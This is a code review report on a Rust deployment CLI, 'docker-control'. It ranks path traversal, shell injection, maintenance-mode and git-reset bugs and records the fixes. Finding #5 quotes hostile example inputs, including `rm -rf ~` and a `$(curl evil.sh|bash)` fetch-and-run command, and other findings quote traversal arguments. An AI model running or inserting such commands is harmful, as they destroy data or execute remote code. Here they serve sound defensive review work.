# Code Review Findings

Full-project review of `docker-control` (excluding `old_template/`). 7 confirmed findings, ranked most severe first, all verified against source (several reproduced directly).

**Status:** 5 of 7 findings fixed (#2, #3, #5, and #7 below, plus the related dispatch-side traversal in the lower-severity section). The rest are still open.

## 1. Path traversal via `--release` into remote deploy path

**File:** `src/commands/deploy.rs:89`

The `--release` CLI argument (or a git tag name) is embedded unsanitized into the remote deploy path. The `sq()` helper shell-escapes metacharacters but does not block `../` traversal.

**Failure scenario:** `docker-control deploy --release "../../../../tmp/pwned"` flows through `release_dir` (line 89) into `remote_release_path` (line 304) and is used unescaped-for-traversal in `mkdir -p {sq(path)}` and `7z x -o{sq(path)}` (lines 318–327), causing the extraction to land outside the `releases/` directory on the remote server.

## 2. Path traversal when writing generated control scripts — ✅ FIXED

**File:** `src/commands/create_script.rs:29`

`create-control-script` builds the output path by joining the raw, unvalidated `name` argument, allowing path traversal when writing the generated (executable) script.

**Failure scenario:** `docker-control create-control-script ../../../../tmp/evil` writes a `.sh` file (with `chmod 0o755` applied at line 63) outside `control-scripts/`, potentially overwriting an unrelated file the invoking user can write to.

**Fix:** Added `utils::sanitize_command_name()` (`src/utils/mod.rs`), which rejects any name that is empty, contains `/` or `\`, or is `.`/`..`. Called at the top of `create_script::execute` before the output path is built. Verified: `create-control-script "../../../../tmp/evil"` now errors with `Invalid command name '...': must be a plain filename with no path separators` before any file is written; normal names still work.

## 3. Aborted deploy leaves production stuck in maintenance mode — ✅ FIXED

**File:** `src/commands/deploy.rs:434`

Maintenance mode was enabled on both the live release (`console_current`) and the new release (`console_new`) before COPS checks, but both abort paths only disabled it on `console_new`, leaving production stuck in maintenance mode.

**Failure scenario:** Operator runs deploy, `cops:outdated` or `cops:permissions` fails, and either declines to continue (lines 513–526, 537–551) or has `ctx.yes` set (lines 506–511, 530–534, which skipped cleanup entirely) — the function returned `Err` immediately after, and `console_current` (still-live production) was left in maintenance mode indefinitely with no further cleanup code to restore it.

**Fix:** Added a `disable_maintenance` closure that turns maintenance off on *both* `console_current` and `console_new` (best-effort, errors ignored since we're already on an error path), and call it at all four early-return points in the COPS integration block (both `ctx.yes` short-circuits and both interactive decline paths). Verified via `cargo nextest run deploy` (7 tests, including `test_failed_deploy_cops_error_non_interactive`) — all pass.

## 4. `update_branch` silently discards unpushed local commits

**File:** `src/git/mod.rs:278`

`update_branch` is commented as a fast-forward but unconditionally force-resets the local branch ref to origin's tip with no ancestry check, silently discarding local-only commits.

**Failure scenario:** `release.rs:95` and `merge.rs:119-120` call `update_branch` directly on the developer's main working repo (not an isolated worktree) during pre-flight checks. If the local branch has unpushed commits — e.g. from an interrupted prior release/merge run — running `release` or `merge` again silently force-resets the ref to origin's tip via `ref_.set_target(remote_target.id(), ...)`, discarding those commits with no warning.

## 5. Unescaped user input injected into generated control script — ✅ FIXED

**File:** `src/commands/create_script.rs:45`

`create-control-script` interpolated free-form user-provided description/name directly into an `echo` statement in the generated bash script with no shell escaping.

**Failure scenario:** Entering a description like `` `rm -rf ~` `` or `$(curl evil.sh|bash)` at the "Description of the command:" prompt embedded that fragment unescaped into a double-quoted echo string in the generated `.sh` file; when the control script was later run via `docker control <name>`, the command substitution executed.

**Fix:** Added `escape_double_quoted()` (`src/commands/create_script.rs`), which backslash-escapes `\`, `"`, `$`, and `` ` `` before interpolation, and applied it to both `description` and `name` when building the script content. Verified: a description of `` `touch /tmp/pwned` and $(echo hacked)`` is now echoed back literally (no file created) instead of being executed as a command substitution.

## 6. Unescaped `service_root` shell injection in deploy cleanup command

**File:** `src/commands/deploy.rs:335`

`ctx.server_root` is spliced unescaped into the cleanup `bash -c` command string, unlike every other remote-path usage in the same function which wraps values with the `sq()` shell-quote helper.

**Failure scenario:** If `service_root` in `.deploy.json` contains a single quote or shell metacharacter, it breaks out of the `bash -c '...'` quoting in the cleanup command (lines 333–337) and injects arbitrary shell executed over SSH on the deploy host. Verified: every neighboring use of `server_root`-derived paths in the same function (lines 307, 318, 324–327, 345, 350–354) is wrapped in `sq()` — only this one is not.

## 7. Broken `_desc_` detection in generated control scripts due to raw-string escaping — ✅ FIXED

**File:** `src/commands/create_script.rs:43`

The generated control-script template escaped `$1` as `\$1` inside a raw Rust string, so the literal backslash reached the file and bash treated it as an escaped literal `$1`, never matching the real first argument.

**Failure scenario:** `custom.rs`'s `get_description()` calls the generated script with `_desc_` as `$1` to retrieve its description for `--help` text. Because `"\$1"` in the written script was a literal escaped string (not variable expansion), the `[[ "\$1" == "_desc_" ]]` check never matched, so every control script created via `create-control-script` always fell through to the placeholder body and permanently showed "`<name> - WAITING FOR IMPLEMENTATION`" instead of the intended description.

**Fix:** Removed the backslash so the template now writes `if [[ "$1" == "_desc_" ]]; then`, letting bash expand `$1` properly. Verified with a standalone reproduction of the generated script: `./script.sh _desc_` now prints the configured description, and `./script.sh` (no args) still falls through to the placeholder body.

---

## Additional lower-severity items (not in the top 7, confirmed by finder agents but cut for the output cap or reclassified after discussion)

- **`src/main.rs:568` (`execute_external_script`)** — ✅ FIXED. Custom command names were joined into a filesystem path with no path-traversal or allowlist check (only an existence test) before being executed with `bash`; reproduced directly (`docker-control --dir /tmp/proj "../../outside/evil.sh"` ran a script outside `control-scripts/`). Initially flagged as arbitrary code execution, but on reflection this isn't a privilege boundary: a caller who can pass a name to `docker-control` already has an equivalent shell and could run `bash ../../outside/evil.sh` directly — no escalation occurs for the normal interactive-CLI use case. The residual concern was a **contract violation**: `get_custom_commands()` (used to build the `--help` listing) implies only scripts under `control-scripts/` are valid subcommands, but dispatch didn't enforce that — which would matter if some other process/wrapper (CI job, webhook, Docker CLI plugin caller) forwarded a partially-trusted subcommand name expecting it to be constrained to that allowlist. **Fix:** same `utils::sanitize_command_name()` helper (shared with #2 above) is called at the top of `execute_external_script` before any path is built. Verified: the traversal argument is now rejected with `Invalid command name '...'` and normal script dispatch (e.g. `docker-control hello`) still works; full `cargo nextest run` suite (23 tests) still passes.
- **`src/utils/forwarding.rs`** — `is_port_open` panics via `.unwrap()` on a non-numeric bind IP; `Platform::Unknown` (any OS besides macOS/Linux/Windows) returns `bind_ip: "localhost"`, causing a startup crash on unsupported platforms.
- **`src/utils/forwarding.rs`** — `start_forwarding` returns `Ok(())` without waiting for the spawned listener to actually bind; a bind failure leaves a permanently idle "zombie" daemon process blocked on `ctrl_c()` that never exits and never provides forwarding.
- **`src/commands/deploy.rs:383-390`** — if `console_command` starts with `"php"` but not literally `"php "` (e.g. `"phpunit"`), the `else` branch still hardcodes `php_bin = "php"`, producing a garbled invocation like `"php phpunit ..."`.
- **`src/commands/add_deploy_config.rs:87`** — `config.environments.insert(env_name.clone(), env)` silently overwrites an existing environment entry with no confirmation prompt.
- **`src/main.rs`** (`Restart`/`Start` arms) — `apply_container_acl` runs immediately after `docker compose up -d` with no readiness check, unlike `SetAcl` which explicitly checks `docker::is_running` first; can transiently fail on slow-starting containers with only a warning and no retry.
- **Reuse/duplication** — the composer-install `docker run` invocation is hand-rolled independently (and has already drifted) in both `src/commands/deploy.rs` and `src/commands/release.rs`; the ACL-apply block (`check_managed` + `apply_host_acl` + `apply_container_acl`) is copy-pasted across the `Start`, `Restart`, and `SetAcl` arms in `src/main.rs`; `src/git/mod.rs` has byte-for-byte duplicate `create_tag`/`create_tag_on_head` methods.
